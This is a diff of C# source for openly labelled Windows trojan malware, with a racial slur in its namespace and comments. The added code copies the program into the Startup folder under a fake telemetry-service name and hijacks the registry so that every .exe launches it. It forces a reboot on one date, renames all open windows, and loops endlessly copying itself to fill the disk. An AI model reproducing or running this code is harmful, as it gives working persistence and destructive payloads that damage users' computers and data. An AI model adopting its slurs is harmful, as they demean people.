@@ -19,43 +19,61 @@ namespace MyNigga {
 //
 // Definitions
 //
+            String Day = DateTime.Now.Day.ToString();
+            String Month = DateTime.Now.Month.ToString();
+            String DayMonth = Day + ":" + Month;
             bool i = true; // For loops
             Random rnd = new Random(); // For file name gen
-            var number0 = rnd.Next();
-//
-// Copy to the startup directory
-//
-        try{ // Without this, running w/o admin will hang it
+            var number0 = rnd.Next(); // A random number
             var fn = System.Reflection.Assembly.GetEntryAssembly().Location; // Get running location
             var location = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\"; // Auto-start location
             var filename = "Windows Compatability Telemetry Service b." + number0 + ".exe"; // Random file name
             var copyto = location + filename; // Combine them
-            System.IO.File.Copy(fn, copyto); // Copy the malware there
-        } catch {}
 //
-// Error message
+// Set as default program to run .exes
 //
-            MessageBox.Show("Shit's hosed",
-                    "ur fucked", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            MessageBox.Show("no",
-                    "", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            try{
+            RegistryKey startwithkey = Registry.ClassesRoot.OpenSubKey("exefile\\shell\\open\\command", true);
+            startwithkey.SetValue("", copyto, RegistryValueKind.String);
+            startwithkey.Close();
+            RegistryKey kee = Registry.ClassesRoot.OpenSubKey("exe\\shell\\open\\command", true);
+            kee.SetValue("kee", copyto, RegistryValueKind.String);
+            kee.Close();
+            } catch{}
 //
-// Payloads
+// Error message + restart if date is right
+//
+            if(DayMonth == "01:10"){
+            MessageBox.Show("Kagou-anti-Kro$oft says not today!",
+                    "Happy Birthday Dan!", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            System.Diagnostics.Process.Start("shutdown.exe", "-r -t 0");}
+//
+// Payloads (infinite loop starts here)
 //
             while(i == true) {
                 Process[] processlist = Process.GetProcesses();
                 foreach (Process processitem in processlist) {
 // Set window titles
-                    SetWindowText(processitem.MainWindowHandle, "Shit is hosed my nigga.");}
+                    SetWindowText(processitem.MainWindowHandle, "TrOjAn.WiN32.ShItS-HoSeD 1.03, I mAke ThIs vIrUs BeCaUsE I dOn'T hAvE NoThInG tO dO!!");}
 // Fill drive with files
                     int number = rnd.Next();
-                    var fn = System.Reflection.Assembly.GetEntryAssembly().Location; // Get running location
                     System.IO.File.Copy(fn, "C:\\Temp\\Oh Hey Thanks " + number + ".exe");
-// Create message box
-                    System.Windows.Forms.MessageBox.Show("I SAID:\nSHIT'S.\nHOSED.\nMY.\nNIGGA.", "LISTEN UP");}
-            Process.GetCurrentProcess().Kill();} 
+            //Process.GetCurrentProcess().Kill();
+            }
             //
             // END
             //
-        } 
-    } 
+        }
+    }
+}
+
+// cant forget:
+
+// TODO: REMOVE EVERYTHING FROM THE CONTEXT MENU
+// TODO: REMOVE EVERYTHING FROM THE CONTEXT MENU
+// TODO: REMOVE EVERYTHING FROM THE CONTEXT MENU
+// TODO: REMOVE EVERYTHING FROM THE CONTEXT MENU
+// TODO: REMOVE EVERYTHING FROM THE CONTEXT MENU
+// TODO: REMOVE EVERYTHING FROM THE CONTEXT MENU
+// TODO: REMOVE EVERYTHING FROM THE CONTEXT MENU
+// TODO: REMOVE EVERYTHING FROM THE CONTEXT MENU
